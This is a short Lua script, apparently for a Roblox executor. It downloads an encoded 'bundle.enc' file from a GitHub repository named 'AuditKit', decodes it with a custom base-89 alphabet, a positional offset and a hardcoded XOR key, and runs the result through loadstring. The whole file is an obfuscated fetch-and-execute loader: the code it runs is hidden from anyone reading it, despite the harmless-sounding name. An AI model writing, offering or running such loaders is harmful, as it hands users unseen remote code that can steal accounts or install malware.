local d = game:HttpGet("https://raw.githubusercontent.com/CaughtUsV2/AuditKit/master/bundle.enc")
if not d or #d < 100 then return end
local cs = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#%()*+,-./:;<=>?@[]^_{|}~"
local cl = {} for i = 1, #cs do cl[cs:sub(i,i)] = i - 1 end
local base = #cs
local bc = tonumber(d:sub(1,8), 16)
local buf = {}
local j = 9
while j + 2 <= #d do
    local v3 = cl[d:sub(j,j)] or 0
    local v2 = cl[d:sub(j+1,j+1)] or 0
    local v1 = cl[d:sub(j+2,j+2)] or 0
    local val = v3 * base * base + v2 * base + v1
    buf[#buf+1] = math.floor(val / 256)
    buf[#buf+1] = val % 256
    j = j + 3
end
if j + 1 <= #d then
    local v2 = cl[d:sub(j,j)] or 0
    local v1 = cl[d:sub(j+1,j+1)] or 0
    buf[#buf+1] = v2 * base + v1
end
while #buf > bc do buf[#buf] = nil end
for i = 1, #buf do buf[i] = (buf[i] - 37 - ((i-1) % 13)) % 256 end
local k = {67,97,117,103,104,116,85,115,50,48,50,54,120,75,57,109}
local out = {}
for i = 1, #buf do
    local x = k[((i-1) % 16) + 1]
    if bit32 then out[i] = string.char(bit32.bxor(buf[i], x))
    else out[i] = string.char(buf[i] ~ x) end
end
loadstring(table.concat(out))()
